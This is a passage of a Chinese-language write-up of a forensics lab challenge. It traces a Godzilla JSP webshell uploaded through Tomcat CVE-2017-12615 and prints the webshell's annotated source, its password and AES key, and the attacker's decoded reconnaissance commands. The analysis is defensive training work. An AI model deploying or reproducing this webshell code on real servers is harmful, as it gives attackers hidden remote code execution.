&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">            <span class="title class_">Object</span> <span class="title class_">Encoder</span> = base64.<span class="title function_">newInstance</span>();</span><br><span class="line">            value = (<span class="title class_">String</span>) <span class="title class_">Encoder</span>.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; byte[].<span class="property">class</span> &#125;).<span class="title function_">invoke</span>(<span class="title class_">Encoder</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">static</span> byte[] <span class="title function_">base64Decode</span>(<span class="title class_">String</span> bs) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="title class_">Class</span> base64;</span><br><span class="line">    byte[] value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        base64 = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="title class_">Object</span> decoder = base64.<span class="title function_">getMethod</span>(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).<span class="title function_">invoke</span>(base64, <span class="literal">null</span>);</span><br><span class="line">        value = (byte[]) decoder.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; <span class="title class_">String</span>.<span class="property">class</span> &#125;).<span class="title function_">invoke</span>(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="title class_">Object</span> decoder = base64.<span class="title function_">newInstance</span>();</span><br><span class="line">            value = (byte[]) decoder.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; <span class="title class_">String</span>.<span class="property">class</span> &#125;).<span class="title function_">invoke</span>(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义了base64的编码和解码方法</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 从HTTP请求参数中获取名为 `pass` 的值，并进行Base64解码</span></span><br><span class="line">    byte[] data = <span class="title function_">base64Decode</span>(request.<span class="title function_">getParameter</span>(pass)); </span><br><span class="line">    <span class="comment">// 使用AES解密 `data`，`false` 表示解密操作</span></span><br><span class="line">    data = <span class="title function_">x</span>(data, <span class="literal">false</span>); </span><br><span class="line">    <span class="comment">// 检查 `session` 中是否已经存在 `payload` 属性</span></span><br><span class="line">    <span class="keyword">if</span> (session.<span class="title function_">getAttribute</span>(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果 `payload` 不存在，则动态加载 `data` 中的字节码，并将其存储在 `session` 中</span></span><br><span class="line">        session.<span class="title function_">setAttribute</span>(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> <span class="title function_">X</span>(<span class="variable language_">this</span>.<span class="title function_">getClass</span>().<span class="title function_">getClassLoader</span>()).<span class="title function_">Q</span>(data)); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果 `payload` 存在，则将解密后的 `data` 存储在 `request` 的 `parameters` 属性中</span></span><br><span class="line">        request.<span class="title function_">setAttribute</span>(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">        <span class="comment">// 创建一个字节数组输出流，用于存储后续操作的结果</span></span><br><span class="line">        java.<span class="property">io</span>.<span class="property">ByteArrayOutputStream</span> arrOut = <span class="keyword">new</span> java.<span class="property">io</span>.<span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="comment">// 从 `session` 中获取 `payload`，并通过反射创建其实例</span></span><br><span class="line">        <span class="title class_">Object</span> f = ((<span class="title class_">Class</span>) session.<span class="title function_">getAttribute</span>(<span class="string">&quot;payload&quot;</span>)).<span class="title function_">newInstance</span>();</span><br><span class="line">        <span class="comment">// 调用 `f` 的 `equals` 方法，将 `arrOut` 作为参数传递（可能是某种操作）</span></span><br><span class="line">        f.<span class="title function_">equals</span>(arrOut);</span><br><span class="line">        <span class="comment">// 调用 `f` 的 `equals` 方法，将 `pageContext` 作为参数传递（可能是某种操作）</span></span><br><span class="line">        f.<span class="title function_">equals</span>(pageContext);</span><br><span class="line">        <span class="comment">// 将 `md5` 字符串的前16个字符写入HTTP响应</span></span><br><span class="line">        response.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(md5.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">        <span class="comment">// 调用 `f` 的 `toString` 方法（可能是某种操作）</span></span><br><span class="line">        f.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="comment">// 将 `arrOut` 中的字节数组进行AES加密，然后进行Base64编码，并写入HTTP响应</span></span><br><span class="line">        response.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(<span class="title function_">base64Encode</span>(<span class="title function_">x</span>(arrOut.<span class="title function_">toByteArray</span>(), <span class="literal">true</span>))); </span><br><span class="line">        <span class="comment">// 将 `md5` 字符串的后16个字符写入HTTP响应</span></span><br><span class="line">        response.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(md5.<span class="title function_">substring</span>(<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">    <span class="comment">// 捕获所有异常，但不做任何处理（静默失败）</span></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>获取并解密数据<ul>
+<li>从HTTP请求参数中获取数据，进行Base64解码和AES解密。</li>
+</ul>
+</li>
+<li>动态加载字节码<ul>
+<li>如果 <code>session</code> 中没有 <code>payload</code>，则将解密后的字节码动态加载为类，并存储在 <code>session</code> 中。</li>
+</ul>
+</li>
+<li>执行恶意操作<ul>
+<li>如果 <code>session</code> 中有 <code>payload</code>，则创建其实例，执行某些操作，并将结果加密后返回给客户端。</li>
+</ul>
+</li>
+<li>返回结果<ul>
+<li>将操作结果加密并写入HTTP响应，同时附加 <code>md5</code> 字符串的部分内容。</li>
+</ul>
+</li>
+</ol>
+<p>其实这里很明显是<strong>Java Servlet反序列化漏洞</strong>，因为这里有对字节流的处理和对恶意代码的加密解密</p>
+<p>这里的代码还有个经典的哥斯拉加密方法，将MD5 哈希值作为验证作用放在我们传入的payload的两边进行掩盖痕迹的操作</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423005159113.png" alt="image-20250423005159113"></p>
+<p>所以我们搜索一下tomcat put协议上传漏洞就能得到漏洞CVE编号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CVE-2017-12615&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并且在下一个流中我们可以看到</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423010644028.png" alt="image-20250423010644028"></p>
+<p>这里的响应中自动设置了cookie，并且cookie中有哥斯拉流量的明显特征就是他在SESSID的末尾有一个分号<code>（;）</code></p>
+<h2 id="3、黑客上传的木马文件名是什么？-提交文件名"><a href="#3、黑客上传的木马文件名是什么？-提交文件名" class="headerlink" title="3、黑客上传的木马文件名是什么？(提交文件名)"></a>3、黑客上传的木马文件名是什么？(提交文件名)</h2><p>上面就可以看到了，这里的木马就是我们的hello.jsp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hello.jsp&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实我觉得这道题应该放在前面而不是放在第二题的后面emmm，好奇怪的排序</p>
+<h2 id="4、黑客上传的木马连接密码是什么？"><a href="#4、黑客上传的木马连接密码是什么？" class="headerlink" title="4、黑客上传的木马连接密码是什么？"></a>4、黑客上传的木马连接密码是什么？</h2><p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423011420087.png" alt="image-20250423011420087"></p>
+<p>这个pass暗示就是密码，也符合哥斯拉webshell的密码参数，并且在后续的传参中也可以看到有对pass的传值,在后续的代码逻辑中，这个密码被用作解密或校验操作，因此它是上传木马后访问或控制的关键。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7f0e6f&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="5、黑客上传的木马解密密钥是什么？"><a href="#5、黑客上传的木马解密密钥是什么？" class="headerlink" title="5、黑客上传的木马解密密钥是什么？"></a>5、黑客上传的木马解密密钥是什么？</h2><h3 id="什么是木马的解密密钥？"><a href="#什么是木马的解密密钥？" class="headerlink" title="什么是木马的解密密钥？"></a><strong>什么是木马的解密密钥？</strong></h3><p>木马的解密密钥是用于解密木马程序中的加密代码或数据的字符串或值。攻击者通常会将恶意代码加密，以避免被安全软件检测到。解密密钥的存在使得木马能够在受害者的系统中执行其真实功能，比如窃取数据或远程控制。通过使用正确的解密密钥，攻击者可以恢复木马的原始代码，进而操控受害者的设备。</p>
+<p>这个怎么看呢？可以从源码里找到逻辑</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423011933056.png" alt="image-20250423011933056"></p>
+<p>然后看一下X</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423012000681.png" alt="image-20250423012000681"></p>
+<p>在<code>public byte[] x(byte[] s, boolean m)</code>方法中，xc 被用来初始化<code>javax.crypto.Cipher </code>对象，从而进行加密或解密操作。<code>c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;)); </code>这一行中，<code>xc.getBytes() </code>将字符串转换为字节数组，作为密钥传递给加密算法。所以xc就是我们需要找到的解密密钥了<br>xc对应的值是<code>String xc=&quot;1710acba6220f62b&quot;;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1710acba6220f62b&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="6、黑客连接webshell后执行的第一条命令是什么？"><a href="#6、黑客连接webshell后执行的第一条命令是什么？" class="headerlink" title="6、黑客连接webshell后执行的第一条命令是什么？"></a>6、黑客连接webshell后执行的第一条命令是什么？</h2><p>题目问我们黑客连接“webshell”后执行的第一条命令是什么，那这里我们就需要深度去解析“哥斯拉流量”了，我们继续往下看</p>
+<h3 id="哥斯拉流量解密工具"><a href="#哥斯拉流量解密工具" class="headerlink" title="哥斯拉流量解密工具"></a>哥斯拉流量解密工具</h3><p>参考文章的师傅推荐了一个<strong>哥斯拉流量解密工具——BlueTeamTools</strong></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423012759183.png" alt="image-20250423012759183"></p>
+<p>然后先把我们之前找到的“密码”，以及“密钥”进行输入</p>
+<p>借一张师傅的图片</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423012901568.png" alt="image-20250423012901568"></p>
+<p>然后就看数据包呗，把每个恶意请求都放进去解密了一下</p>
+<p>发现了哥斯拉流量的一条测试流量</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014420445.png" alt="image-20250423014420445"></p>
+<p>测试连接命令test，返回少量数据（即ok）</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014508150.png" alt="image-20250423014508150"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014523510.png" alt="image-20250423014523510"></p>
+<p>然后找到这条恶意请求</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014616311.png" alt="image-20250423014616311"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014801550.png" alt="image-20250423014801550"></p>
+<p>这里调用了**<code>getBasicsInfo</code>**方法，通常用于获取系统或应用程序的基本信息。并且返回了很多内容</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014836889.png" alt="image-20250423014836889"></p>
+<p>但是我们这里需要找的是第一条命令而不是调用函数，所以这里并不是我们想找的答案</p>
+<p>继续往下看</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423013427596.png" alt="image-20250423013427596"></p>
+<p>传入请求数据返回结果</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423013436578.png" alt="image-20250423013436578"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdLine sh -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;uname -rmethodName execCommand</span><br></pre></td></tr></table></figure>
+
+<h3 id="恶意代码分析"><a href="#恶意代码分析" class="headerlink" title="恶意代码分析"></a>恶意代码分析</h3><h4 id="命令执行的描述"><a href="#命令执行的描述" class="headerlink" title="命令执行的描述"></a><strong>命令执行的描述</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdLine sh -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>**<code>cmdLine</code>**：表示这是一条命令行指令。</p>
+</li>
+<li><p>**<code>sh</code>**：调用 <code>sh</code>（Shell）来执行命令。</p>
+</li>
+<li><p>**<code>-c</code>**：<code>sh</code> 的参数，表示后面是一个字符串形式的命令。</p>
+</li>
+<li><p><code>&quot;cd &quot;/&quot;;uname -r&quot;</code></p>
+<p>：要执行的命令：</p>
+<ul>
+<li><code>cd &quot;/&quot;</code>：切换到根目录。</li>
+<li><code>uname -r</code>：获取当前操作系统的内核版本。</li>
+</ul>
+</li>
+<li><p>**<code>2&gt;&amp;1</code>**：将标准错误输出（<code>stderr</code>）重定向到标准输出（<code>stdout</code>）。</p>
+</li>
+</ul>
+<h4 id="参数分解"><a href="#参数分解" class="headerlink" title="参数分解"></a><strong>参数分解</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg-3 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>arg-3</code>**：这是命令的第 3 个参数（从 0 开始计数）。</li>
+<li>**<code>2&gt;&amp;1</code>**：重定向标准错误输出到标准输出。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">executableFile sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>executableFile</code>**：表示可执行文件的名称。</li>
+<li>**<code>sh</code>**：使用的可执行文件是 <code>sh</code>（Shell）。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">executableArgs -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>executableArgs</code>**：表示可执行文件的参数。</li>
+<li>**<code>-c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1</code>**：传递给 <code>sh</code> 的参数。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg-0 sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>arg-0</code>**：第 0 个参数，即可执行文件本身，这里是 <code>sh</code>。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">argsCount 4</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>argsCount</code>**：参数的总数，这里是 4 个。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg-1 -c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>arg-1</code>**：第 1 个参数，这里是 <code>-c</code>。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg-2 cd &quot;/&quot;;uname -r</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>arg-2</code>**：第 2 个参数，这里是 <code>cd &quot;/&quot;;uname -r</code>。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methodName execCommand</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>methodName</code>**：表示执行命令的方法名称，这里是 <code>execCommand</code>。</li>
+</ul>
+<p>这段描述展示了一个通过 <code>sh</code> 执行命令的过程：</p>
+<ol>
+<li>调用 <code>sh</code>，并传递参数 <code>-c</code> 和一个命令字符串 <code>cd &quot;/&quot;;uname -r</code>。</li>
+<li>命令字符串的作用是：<ul>
+<li>切换到根目录（<code>cd &quot;/&quot;</code>）。</li>
+<li>获取当前操作系统的内核版本（<code>uname -r</code>）。</li>
+</ul>
+</li>
+<li>标准错误输出被重定向到标准输出（<code>2&gt;&amp;1</code>）。</li>
+<li>参数总数为 4 个：<ul>
+<li><code>arg-0</code>：<code>sh</code>。</li>
+<li><code>arg-1</code>：<code>-c</code>。</li>
+<li><code>arg-2</code>：<code>cd &quot;/&quot;;uname -r</code>。</li>
+<li><code>arg-3</code>：<code>2&gt;&amp;1</code>。</li>
+</ul>
+</li>
+<li>执行命令的方法名称为 <code>execCommand</code>。</li>
+</ol>
+<p>既然这里有响应，那我们把响应也放进去看一下</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014226739.png" alt="image-20250423014226739"></p>
+<p>所以<strong>黑客第一次执行了命令——<code>uname -r</code>，想看看系统的内核版本信息有没有漏洞什么的，最后返回了系统信息——<code>4.19.0-25-amd64</code>；</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;uname -r&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可能有人就疑惑了，这里不是执行的<code>cd &quot;/&quot;;uname -r</code>吗，为什么最终的答案是uname -r</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423015243359.png" alt="image-20250423015243359"></p>
+<h2 id="7、黑客连接webshell时查询当前shell的权限是什么？"><a href="#7、黑客连接webshell时查询当前shell的权限是什么？" class="headerlink" title="7、黑客连接webshell时查询当前shell的权限是什么？"></a>7、黑客连接webshell时查询当前shell的权限是什么？</h2><p>继续往下看黑客又进行了哪些命令吧</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423015517221.png" alt="image-20250423015517221"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423015508224.png" alt="image-20250423015508224"></p>
+<h3 id="关于id命令"><a href="#关于id命令" class="headerlink" title="关于id命令"></a>关于id命令</h3><p><strong><code>id</code></strong> 是一个在 Linux 和 Unix 系统中常用的命令，用于显示当前用户或指定用户的 <strong>用户身份信息</strong>。</p>
+<p><code>id</code> 命令的主要功能是显示以下信息：</p>
+<ul>
+<li><strong>用户 ID（UID）</strong>：当前用户的唯一标识符。</li>
+<li><strong>组 ID（GID）</strong>：当前用户所属的主组的唯一标识符。</li>
+<li><strong>所属组</strong>：当前用户所属的所有组（包括主组和附加组）。</li>
+<li><strong>用户名</strong>：当前用户的用户名。</li>
+</ul>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423015657088.png" alt="image-20250423015657088"></p>
+<p>uid&#x3D;0(root)：当前用户的用户ID（UID）是0，表示该用户是超级用户（root）。在Unix&#x2F;Linux系统中，UID 0代表系统的管理员，有完全的权限。</p>
+<p>gid&#x3D;0(root)：当前用户的组ID（GID）也是0，表示该用户属于root组。</p>
+<p>groups&#x3D;0(root)：列出了当前用户所属的组，这里只有root组。</p>
+<p>可以看到是root用户，那么此时的shell的权限就是root了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;root&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="8、黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？"><a href="#8、黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？" class="headerlink" title="8、黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？"></a>8、黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？</h2><p>这里先补充一下基础知识</p>
+<h3 id="Liunx常见的发行的系统版本"><a href="#Liunx常见的发行的系统版本" class="headerlink" title="Liunx常见的发行的系统版本"></a>Liunx常见的发行的系统版本</h3><ul>
+<li>Ubuntu：</li>
+</ul>
+<p>用户友好，适合新手和开发者。</p>
+<p>有多个版本，包括桌面版和服务器版。</p>
+<ul>
+<li>Debian：</li>
+</ul>
+<p>以稳定性和自由软件为宗旨。</p>
+<p>是许多其他发行版（如Ubuntu）的基础。</p>
+<ul>
+<li>Fedora：</li>
+</ul>
+<p>由Red Hat支持，注重最新技术和开源软件。</p>
+<p>提供较新版本的软件包。</p>
+<ul>
+<li>CentOS：</li>
+</ul>
+<p>基于Red Hat Enterprise Linux（RHEL），适合企业使用。</p>
+<p>提供长期支持和稳定性。</p>
+<ul>
+<li>Arch Linux：</li>
+</ul>
+<p>以简单、灵活和用户控制为特点。</p>
+<p>采用滚动更新模型，适合高级用户。</p>
+<ul>
+<li>openSUSE：</li>
+</ul>
+<p>提供多种安装方式和桌面环境。</p>
+<p>包括适合开发和服务器的版本。</p>
+<ul>
+<li>Linux Mint：</li>
+</ul>
+<p>基于Ubuntu，设计友好，适合初学者。</p>
+<p>提供多种桌面环境，如Cinnamon、MATE和XFCE。</p>
+<ul>
+<li>Slackware：</li>
+</ul>
+<p>被认为是最古老的Linux发行版之一，注重稳定性和简单性。<br>适合那些喜欢手动配置系统的用户。</p>
+<h3 id="什么命令可以查看到当前的发行版本？"><a href="#什么命令可以查看到当前的发行版本？" class="headerlink" title="什么命令可以查看到当前的发行版本？"></a>什么命令可以查看到当前的发行版本？</h3><h4 id="1-lsb-release命令"><a href="#1-lsb-release命令" class="headerlink" title="1.lsb_release命令"></a>1.lsb_release命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
+
+<p><strong>这个命令会显示详细的版本信息，包括发行版名称、版本号等。</strong></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020147901.png" alt="image-20250423020147901"></p>
+<p><strong>常用选项：</strong></p>
+<ul>
+<li>**<code>-a</code>**：显示所有信息（包括发行版 ID、描述、版本号和代号）。</li>
+<li>**<code>-d</code>**：仅显示描述信息。</li>
+<li>**<code>-r</code>**：仅显示版本号。</li>
+<li>**<code>-c</code>**：仅显示代号。</li>
+</ul>
+<h4 id="2-cat-etc-os-release"><a href="#2-cat-etc-os-release" class="headerlink" title="2.cat  /etc/os-release"></a>2.<code>cat  /etc/os-release</code></h4><p><code>/etc/os-release</code> 是一个包含发行版信息的配置文件。<strong>对于大多数发行版，可以查看 <code>/etc/os-release</code> 文件</strong>，<strong>对于Debian和Ubuntu系统，可以查看 <code>/etc/issue</code> 或 <code>/etc/debian_version</code></strong></p>
+<h4 id="3-uname命令"><a href="#3-uname命令" class="headerlink" title="3.uname命令"></a>3.uname命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p><code>uname</code> <strong>这个命令会显示内核版本和其他系统信息，但不包括发行版的名称。</strong></p>
+<p>那我们就往后找呗，反正命令也不多对吧，然后在下一个流就看到了</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020517316.png" alt="image-20250423020517316"></p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020523631.png" alt="image-20250423020523631"></p>
+<p>这里是查看了<code>/etc/os-release</code>文件去查看发行版本信息的，那我们看看响应</p>
+<p><img src="/../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020610594.png" alt="image-20250423020610594"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;</span><br><span class="line">NAME=&quot;Debian GNU/Linux&quot;</span><br><span class="line">VERSION_ID=&quot;10&quot;</span><br><span class="line">VERSION=&quot;10 (buster)&quot;</span><br><span class="line">VERSION_CODENAME=buster</span><br><span class="line">ID=debian</span><br><span class="line">HOME_URL=&quot;https://www.debian.org/&quot;</span><br><span class="line">SUPPORT_URL=&quot;https://www.debian.org/support&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>PRETTY_NAME</code>：”Debian GNU&#x2F;Linux 10 (buster)” 表示操作系统的名称和版本。</p>
+</li>
+<li><p><code>NAME</code>：操作系统的基本名称，这里是 Debian GNU&#x2F;Linux。</p>
+</li>
+<li><p><code>VERSION_ID 和 VERSION</code>：指示版本号为10，代号为“buster”。</p>
+</li>
+<li><p><code>VERSION_CODENAME</code>：该版本的代号，用于在包管理和支持中识别。</p>
+</li>
+<li><p><code>ID</code>：表示操作系统为“debian”。</p>
+</li>
+<li><p><code>URLs</code>：提供了关于该发行版的主页、支持和错误报告的链接。</p>
+</li>
+</ul>
